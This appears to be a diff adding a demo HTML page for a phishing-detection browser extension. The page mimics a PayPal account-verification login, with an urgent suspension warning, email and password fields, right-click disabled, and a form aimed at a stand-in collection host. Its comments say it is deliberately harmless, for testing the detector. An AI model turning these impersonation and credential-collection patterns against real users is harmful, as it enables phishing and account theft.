@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- ShadowShield DEMO PAGE. This is a harmless local file that imitates the
+     *patterns* of a phishing page so you can watch the extension catch it.
+     It sends nothing anywhere; the form action is a non-existent domain.
+     To use it: chrome://extensions -> ShadowShield -> Details ->
+     enable "Allow access to file URLs", then open this file in Chrome. -->
+<head>
+<meta charset="utf-8">
+<title>PayPal — Verify your account</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:40px}
+  .box{max-width:400px;margin:0 auto;background:#fff;border:1px solid #ddd;border-radius:8px;padding:30px}
+  h1{color:#003087;font-size:22px}
+  .alert{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:6px;font-size:14px}
+  input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
+  button{width:100%;background:#0070ba;color:#fff;border:none;padding:12px;border-radius:20px;font-size:15px}
+</style>
+</head>
+<body oncontextmenu="return false">
+  <div class="box">
+    <h1>PayPal</h1>
+    <p class="alert">⚠ Your account has been suspended due to unusual sign-in activity.
+    Verify your identity immediately — failure to verify will result in permanent limitation.</p>
+    <form action="http://account-verification-center.example/collect" method="post">
+      <input type="email" placeholder="Email address">
+      <input type="password" placeholder="Password">
+      <button type="button">Verify immediately</button>
+    </form>
+    <p style="font-size:11px;color:#999">ShadowShield demo page — intentionally fake, sends nothing.</p>
+  </div>
+</body>
+</html>
